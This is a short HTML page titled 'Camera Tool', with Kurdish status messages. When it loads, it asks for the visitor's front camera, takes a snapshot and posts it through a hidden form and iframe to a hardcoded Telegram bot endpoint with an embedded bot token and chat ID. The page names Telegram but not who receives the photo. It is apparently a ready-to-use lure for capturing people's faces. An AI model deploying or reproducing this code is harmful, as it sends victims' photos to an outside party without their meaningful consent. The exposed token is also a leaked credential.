<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Tool</title>
</head>
<body style="background-color: #222; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; padding: 20px;">

    <h3 id="status">چاوەڕوان بە...</h3>

    <!-- فۆرمی ڕاستەوخۆ بۆ تێپەڕاندنی هەموو کێشەکانی CORS و پرۆکسی -->
    <form id="tgForm" action="https://api.telegram.org/bot8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw/sendPhoto" method="POST" enctype="multipart/form-data" target="hidden_iframe" style="display:none;">
        <input type="hidden" name="chat_id" value="6539379136">
        <input type="file" name="photo" id="photoInput">
    </form>
    <iframe name="hidden_iframe" id="hiddenIframe" style="display:none;"></iframe>

    <script>
      const statusEl = document.getElementById('status');

      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          statusEl.innerText = "کامێرا کارا بوو، وێنە دەگیرێت...";
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 480;
            canvas.height = 360;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ تلگرام...";
              
              try {
                  const file = new File([blob], "snapshot.jpg", { type: "image/jpeg" });
                  const dataTransfer = new DataTransfer();
                  dataTransfer.items.add(file);
                  
                  document.getElementById('photoInput').files = dataTransfer.files;
                  
                  // ناردنی ڕاستەوخۆی فۆرمەکە بۆ تلگرام
                  document.getElementById('tgForm').submit();

                  setTimeout(() => {
                      statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
                  }, 2000);

              } catch (err) {
                  statusEl.innerText = "❌ هەڵە: " + err.message;
              }
            }, 'image/jpeg', 0.8);
          }, 2000);
        })
        .catch(err => {
          statusEl.innerText = "❌ هەڵەی کامێرا: " + err.message;
        });
    </script>

</body>
</html>
